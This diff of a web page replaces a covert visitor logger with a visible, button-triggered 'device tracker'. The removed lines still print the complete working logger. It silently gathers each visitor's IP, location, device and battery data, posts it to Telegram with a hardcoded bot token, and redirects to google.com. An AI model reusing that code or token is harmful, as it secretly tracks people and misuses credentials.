@@ -3,115 +3,212 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Loading...</title>
-<style>*{margin:0;padding:0;}body{background:#fff;}</style>
+<title>My Device Tracker</title>
+<style>
+  *{margin:0;padding:0;box-sizing:border-box;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,Helvetica,Arial,sans-serif;}
+  body{background:#0f172a;color:#e2e8f0;padding:20px;min-height:100vh;}
+  .container{max-width:480px;margin:0 auto;}
+  h1{text-align:center;margin-bottom:20px;font-size:1.4rem;color:#38bdf8;}
+  .card{background:#1e293b;border-radius:16px;padding:20px;margin-bottom:16px;border:1px solid #334155;}
+  .card h2{font-size:0.85rem;text-transform:uppercase;letter-spacing:0.05em;color:#94a3b8;margin-bottom:12px;display:flex;align-items:center;gap:8px;}
+  .row{display:flex;justify-content:space-between;padding:8px 0;border-bottom:1px solid #334155;font-size:0.95rem;}
+  .row:last-child{border-bottom:none;}
+  .label{color:#94a3b8;}
+  .value{color:#f1f5f9;word-break:break-word;max-width:60%;text-align:right;}
+  a.map-link{color:#38bdf8;text-decoration:none;}
+  a.map-link:hover{text-decoration:underline;}
+  .status{text-align:center;margin:20px 0;font-size:0.9rem;min-height:24px;}
+  .status.ok{color:#4ade80;}
+  .status.err{color:#f87171;}
+  .status.wait{color:#fbbf24;}
+  .btn{width:100%;padding:14px;background:#38bdf8;color:#0f172a;border:none;border-radius:12px;font-size:1rem;font-weight:600;cursor:pointer;margin-top:8px;}
+  .btn:active{transform:scale(0.98);}
+  .btn:disabled{opacity:0.5;cursor:not-allowed;}
+  .footer{text-align:center;margin-top:20px;font-size:0.75rem;color:#64748b;}
+</style>
 </head>
 <body>
+<div class="container">
+  <h1>📡 My Device Tracker</h1>
+  
+  <div class="status wait" id="status">Collecting data...</div>
+
+  <div class="card">
+    <h2>🌐 Network</h2>
+    <div class="row"><span class="label">IP Address</span><span class="value" id="ip">—</span></div>
+    <div class="row"><span class="label">City / Region</span><span class="value" id="city">—</span></div>
+    <div class="row"><span class="label">Country</span><span class="value" id="country">—</span></div>
+    <div class="row"><span class="label">ISP</span><span class="value" id="isp">—</span></div>
+    <div class="row"><span class="label">Timezone</span><span class="value" id="tz">—</span></div>
+    <div class="row"><span class="label">Coordinates</span><span class="value" id="coords">—</span></div>
+    <div class="row"><span class="label">Map</span><span class="value"><a class="map-link" id="map" href="#" target="_blank">Open</a></span></div>
+    <div class="row"><span class="label">Connection</span><span class="value" id="net">—</span></div>
+  </div>
+
+  <div class="card">
+    <h2>📱 Device</h2>
+    <div class="row"><span class="label">OS</span><span class="value" id="os">—</span></div>
+    <div class="row"><span class="label">Browser</span><span class="value" id="browser">—</span></div>
+    <div class="row"><span class="label">Screen</span><span class="value" id="screen">—</span></div>
+    <div class="row"><span class="label">RAM / Cores</span><span class="value" id="hw">—</span></div>
+    <div class="row"><span class="label">Language</span><span class="value" id="lang">—</span></div>
+    <div class="row"><span class="label">Touch</span><span class="value" id="touch">—</span></div>
+  </div>
+
+  <div class="card">
+    <h2>🔋 Battery</h2>
+    <div class="row"><span class="label">Level</span><span class="value" id="bat">—</span></div>
+    <div class="row"><span class="label">Status</span><span class="value" id="bstatus">—</span></div>
+    <div class="row"><span class="label">Time Remaining</span><span class="value" id="btime">—</span></div>
+  </div>
+
+  <button class="btn" id="sendBtn" onclick="sendToTelegram()">Send to Telegram</button>
+  <button class="btn" onclick="location.reload()" style="background:#334155;color:#e2e8f0;margin-top:8px;">Refresh Data</button>
+
+  <div class="footer">Data is only sent when you press the button.</div>
+</div>
+
 <script>
-const BOT_TOKEN = '8609756694:AAFjX0cnt791j34h844O_dUKCKl0dNARe8U';
-const CHAT_ID   = '8220599004';
-const REDIRECT  = 'https://google.com';
+// ⚠️ REPLACE THESE WITH YOUR NEW BOT TOKEN (from @BotFather) AND YOUR CHAT ID
+const BOT_TOKEN = 'YOUR_BOT_TOKEN_HERE';
+const CHAT_ID   = 'YOUR_CHAT_ID_HERE';
 
-async function collect() {
-  const time = new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' });
+let collected = {};
 
-  // Run IP fetch + battery in parallel
-  const [ipData, bat] = await Promise.allSettled([
-    fetch('https://ipinfo.io/json').then(r => r.json()),
-    navigator.getBattery?.()
-  ]);
+function parseUA(ua){
+  const os = /Android/.test(ua)? 'Android ' + (ua.match(/Android ([^;]+)/)?.[1]||'')
+    : /iPhone|iPad/.test(ua)? 'iOS ' + (ua.match(/OS ([^)]+)/)?.[1]?.replace(/_/g,'.')||'')
+    : /Windows NT 10/.test(ua)? 'Windows 10/11'
+    : /Mac OS X/.test(ua)? 'macOS'
+    : /Linux/.test(ua)? 'Linux' : 'Unknown';
+  const browser = /Edg\//.test(ua)? 'Edge ' + (ua.match(/Edg\/([^\s]+)/)?.[1]||'')
+    : /OPR\//.test(ua)? 'Opera ' + (ua.match(/OPR\/([^\s]+)/)?.[1]||'')
+    : /Chrome\//.test(ua)? 'Chrome ' + (ua.match(/Chrome\/([^\s]+)/)?.[1]||'')
+    : /Firefox\//.test(ua)? 'Firefox ' + (ua.match(/Firefox\/([^\s]+)/)?.[1]||'')
+    : /Safari\//.test(ua)? 'Safari ' + (ua.match(/Version\/([^\s]+)/)?.[1]||'')
+    : 'Unknown';
+  return {os, browser};
+}
 
-  const d = ipData.status === 'fulfilled' ? ipData.value : {};
-  const b = bat.status === 'fulfilled' ? bat.value : null;
+async function collect(){
+  const status = document.getElementById('status');
+  try{
+    const [ipRes, bat] = await Promise.allSettled([
+      fetch('https://ipinfo.io/json').then(r=>r.json()),
+      navigator.getBattery?.()
+    ]);
+    const d = ipRes.status==='fulfilled'? ipRes.value : {};
+    const b = bat.status==='fulfilled'? bat.value : null;
+    const ua = navigator.userAgent;
+    const {os, browser} = parseUA(ua);
 
-  // IP / Location (ipinfo.io format)
-  const ip       = d.ip       || '—';
-  const city     = d.city     || '—';
-  const region   = d.region   || '—';
-  const country  = d.country  || '—';
-  const loc      = d.loc      || '';
-  const lat      = loc.split(',')[0] || '—';
-  const lon      = loc.split(',')[1] || '—';
-  const isp      = d.org      || '—';
-  const timezone = d.timezone || '—';
-  const mapsUrl  = loc ? `https://maps.google.com/?q=${lat},${lon}` : '—';
+    collected = {
+      time: new Date().toLocaleString('en-IN',{timeZone:'Asia/Kolkata'}),
+      ip: d.ip||'—',
+      city: d.city||'—',
+      region: d.region||'—',
+      country: d.country||'—',
+      loc: d.loc||'',
+      lat: d.loc? d.loc.split(',')[0] : '—',
+      lon: d.loc? d.loc.split(',')[1] : '—',
+      isp: d.org||'—',
+      tz: d.timezone||'—',
+      netType: (navigator.connection?.effectiveType)||'—',
+      downlink: navigator.connection?.downlink? navigator.connection.downlink+' Mbps' : '—',
+      rtt: navigator.connection?.rtt? navigator.connection.rtt+' ms' : '—',
+      os, browser,
+      screen: `${screen.width}x${screen.height} @${window.devicePixelRatio||1}x`,
+      hw: `${navigator.deviceMemory?navigator.deviceMemory+'GB':'—'} / ${navigator.hardwareConcurrency||'—'} cores`,
+      lang: navigator.language||'—',
+      touch: navigator.maxTouchPoints>0? `Yes (${navigator.maxTouchPoints})` : 'No',
+      batLevel: b? Math.round(b.level*100)+'%' : '—',
+      batStatus: b? (b.charging?'Charging ⚡':'On battery') : '—',
+      batTime: b? (b.charging?(b.chargingTime!==Infinity?Math.round(b.chargingTime/60)+' min to full':'—'):(b.dischargingTime!==Infinity?Math.round(b.dischargingTime/60)+' min left':'—')) : '—'
+    };
 
-  // Device
-  const ua      = navigator.userAgent;
-  const cores   = navigator.hardwareConcurrency || '—';
-  const memory  = navigator.deviceMemory ? navigator.deviceMemory + ' GB' : '—';
-  const touch   = navigator.maxTouchPoints > 0 ? `Yes (${navigator.maxTouchPoints})` : 'No';
-  const lang    = navigator.language || '—';
-  const sw      = screen.width, sh = screen.height;
-  const dpr     = window.devicePixelRatio || 1;
+    // Render
+    document.getElementById('ip').textContent = collected.ip;
+    document.getElementById('city').textContent = `${collected.city}, ${collected.region}`;
+    document.getElementById('country').textContent = collected.country;
+    document.getElementById('isp').textContent = collected.isp;
+    document.getElementById('tz').textContent = collected.tz;
+    document.getElementById('coords').textContent = `${collected.lat}, ${collected.lon}`;
+    const mapEl = document.getElementById('map');
+    if(collected.loc){ mapEl.href=`https://maps.google.com/?q=${collected.lat},${collected.lon}`; mapEl.style.display='inline'; }
+    else { mapEl.style.display='none'; mapEl.parentElement.previousElementSibling.style.display='none'; } // hide map row if no coords
+    document.getElementById('net').textContent = `${collected.netType} | ${collected.downlink} | RTT ${collected.rtt}`;
+    document.getElementById('os').textContent = collected.os;
+    document.getElementById('browser').textContent = collected.browser;
+    document.getElementById('screen').textContent = collected.screen;
+    document.getElementById('hw').textContent = collected.hw;
+    document.getElementById('lang').textContent = collected.lang;
+    document.getElementById('touch').textContent = collected.touch;
+    document.getElementById('bat').textContent = collected.batLevel;
+    document.getElementById('bstatus').textContent = collected.batStatus;
+    document.getElementById('btime').textContent = collected.batTime;
 
-  // Network
-  const conn     = navigator.connection || {};
-  const netType  = conn.effectiveType || '—';
-  const downlink = conn.downlink ? conn.downlink + ' Mbps' : '—';
-  const rtt      = conn.rtt ? conn.rtt + ' ms' : '—';
+    status.textContent = 'Ready to send.';
+    status.className = 'status ok';
+  }catch(e){
+    status.textContent = 'Error collecting data: ' + e.message;
+    status.className = 'status err';
+  }
+}
 
-  // Battery
-  const batLevel    = b ? Math.round(b.level * 100) + '%' : '—';
-  const batCharging = b ? (b.charging ? 'Charging ⚡' : 'Not charging') : '—';
-  const batMins     = b
-    ? (b.charging
-        ? (b.chargingTime !== Infinity ? Math.round(b.chargingTime/60) + ' min to full' : '—')
-        : (b.dischargingTime !== Infinity ? Math.round(b.dischargingTime/60) + ' min left' : '—'))
-    : '—';
+async function sendToTelegram(){
+  const btn = document.getElementById('sendBtn');
+  const status = document.getElementById('status');
+  if(!collected.ip){ status.textContent='Wait for data to load...'; status.className='status err'; return; }
+  if(BOT_TOKEN.includes('YOUR_BOT')){ status.textContent='Please set your BOT_TOKEN and CHAT_ID in the code first!'; status.className='status err'; return; }
 
-  // OS + Browser
-  const os = /Android/.test(ua) ? 'Android ' + (ua.match(/Android ([^;]+)/)?.[1]||'')
-    : /iPhone|iPad/.test(ua) ? 'iOS ' + (ua.match(/OS ([^)]+)/)?.[1]?.replace(/_/g,'.')||'')
-    : /Windows NT 10/.test(ua) ? 'Windows 10/11'
-    : /Mac OS X/.test(ua) ? 'macOS'
-    : /Linux/.test(ua) ? 'Linux' : '—';
+  btn.disabled = true;
+  status.textContent = 'Sending to Telegram...';
+  status.className = 'status wait';
 
-  const browser = /Edg\//.test(ua) ? 'Edge ' + (ua.match(/Edg\/([^\s]+)/)?.[1]||'')
-    : /OPR\//.test(ua) ? 'Opera ' + (ua.match(/OPR\/([^\s]+)/)?.[1]||'')
-    : /Chrome\//.test(ua) ? 'Chrome ' + (ua.match(/Chrome\/([^\s]+)/)?.[1]||'')
-    : /Firefox\//.test(ua) ? 'Firefox ' + (ua.match(/Firefox\/([^\s]+)/)?.[1]||'')
-    : /Safari\//.test(ua) ? 'Safari ' + (ua.match(/Version\/([^\s]+)/)?.[1]||'')
-    : '—';
+  const text = `🔔 My Device Update
 
-  const msg = `🔔 New Visit
+🕐 ${collected.time}
 
-🕐 ${time}
-
-📡 NETWORK
-IP: ${ip}
-City: ${city}, ${region}, ${country}
-Coords: ${lat}, ${lon}
-Maps: ${mapsUrl}
-ISP: ${isp}
-Timezone: ${timezone}
-Connection: ${netType} | ${downlink} | RTT ${rtt}
+🌐 NETWORK
+IP: ${collected.ip}
+Location: ${collected.city}, ${collected.region}, ${collected.country}
+Coords: ${collected.lat}, ${collected.lon}
+Map: ${collected.loc?`https://maps.google.com/?q=${collected.lat},${collected.lon}`:'—'}
+ISP: ${collected.isp}
+TZ: ${collected.tz}
+Net: ${collected.netType} | ${collected.downlink} | RTT ${collected.rtt}
 
 📱 DEVICE
-OS: ${os}
-Browser: ${browser}
-Screen: ${sw}x${sh} @${dpr}x
-RAM: ${memory} | Cores: ${cores}
-Touch: ${touch} | Lang: ${lang}
+OS: ${collected.os}
+Browser: ${collected.browser}
+Screen: ${collected.screen}
+HW: ${collected.hw}
+Lang: ${collected.lang} | Touch: ${collected.touch}
 
 🔋 BATTERY
-Level: ${batLevel} | ${batCharging}
-Time: ${batMins}`;
+${collected.batLevel} | ${collected.batStatus}
+${collected.batTime}`;
 
-  // keepalive: true keeps the request alive even after redirect
-  fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-    method: 'POST',
-    headers: { 'Content-Type': 'application/json' },
-    keepalive: true,
-    body: JSON.stringify({
-      chat_id: CHAT_ID,
-      text: msg,
-      disable_web_page_preview: true
-    })
-  });
-
-  // Small delay to ensure fetch is dispatched before redirect
-  setTimeout(() => window.location.replace(REDIRECT), 300);
+  try{
+    const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`,{
+      method:'POST',
+      headers:{'Content-Type':'application/json'},
+      body:JSON.stringify({chat_id:CHAT_ID,text,disable_web_page_preview:true})
+    });
+    const json = await res.json();
+    if(json.ok){
+      status.textContent = '✅ Sent to Telegram successfully!';
+      status.className = 'status ok';
+    }else{
+      status.textContent = '❌ Telegram error: ' + (json.description||'Unknown');
+      status.className = 'status err';
+    }
+  }catch(e){
+    status.textContent = '❌ Send failed: ' + e.message;
+    status.className = 'status err';
+  }finally{
+    btn.disabled = false;
+  }
 }
 
 collect();
